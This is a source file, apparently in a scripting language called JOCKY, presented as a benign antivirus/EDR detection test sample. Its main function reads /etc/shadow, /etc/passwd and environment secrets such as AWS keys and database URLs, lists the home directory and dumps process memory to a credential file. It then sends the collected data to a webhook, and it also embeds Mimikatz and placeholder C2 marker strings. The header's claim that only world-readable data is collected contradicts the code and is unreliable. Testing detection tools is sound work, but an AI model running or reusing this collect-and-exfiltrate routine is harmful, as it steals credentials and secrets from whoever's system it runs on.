// av_bait.jk — AV/EDR detection test sample (benign, lab use only).
//
// JOCKY equivalent of av_bait.c: the same "credential-collection / recon"
// behavior profile, expressed with JOCKY forensic builtins:
//   - embeds the EICAR test string (ClamAV signature trigger)
//   - sys.process_list()  -> process enumeration
//   - fs.read / fs.list   -> reads /etc/passwd, /etc/shadow, $HOME listing
//   - env.get             -> credential-relevant environment variables
//   - fs.write            -> writes collected data to /tmp (classic staging)
//   - net.post            -> accumulates a field for the lab webhook exfil
//   - net.send            -> POSTs all accumulated fields in a single request
//   - mem.dump (Windows)  -> process memory dump (credential-stealer pattern)
//
// Does nothing harmful: reads are best-effort and only world-readable data is
// collected. Everything is sent in a SINGLE POST (JSON object with a "source"
// field identifying this file) to a lab webhook so the collection behavior can
// be observed from a control server. Built for lab AV-scan comparison against
// the plain C build.

fn main() {
    net.post("eicar_marker", "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

    net.post("credential_marker", "sekurlsa::logonpasswords");
    net.post("c2_marker", "c2.evil-domain.com/beacon");

    net.post("process_list", sys.process_list());

    net.post("etc_passwd", fs.read("/etc/passwd"));
    net.post("etc_shadow", fs.read("/etc/shadow"));

    net.post("env_USER", env.get("USER"));
    net.post("env_HOME", env.get("HOME"));
    net.post("env_SSH_AUTH_SOCK", env.get("SSH_AUTH_SOCK"));
    net.post("env_AWS_ACCESS_KEY_ID", env.get("AWS_ACCESS_KEY_ID"));
    net.post("env_AWS_SECRET_ACCESS_KEY", env.get("AWS_SECRET_ACCESS_KEY"));
    net.post("env_DATABASE_URL", env.get("DATABASE_URL"));

    let home: str = env.get("HOME");
    net.post("home_listing", fs.list(home));
    net.post("home_exists", "true");

    net.post("staged_collection", "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n");
    fs.write("/tmp/av_bait_collected.txt", "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n");
    net.post("staged_readback", fs.read("/tmp/av_bait_collected.txt"));

    mem.dump(4, "C:\\temp\\cred_dump.bin");

    net.post("done", "done");
    net.send();
}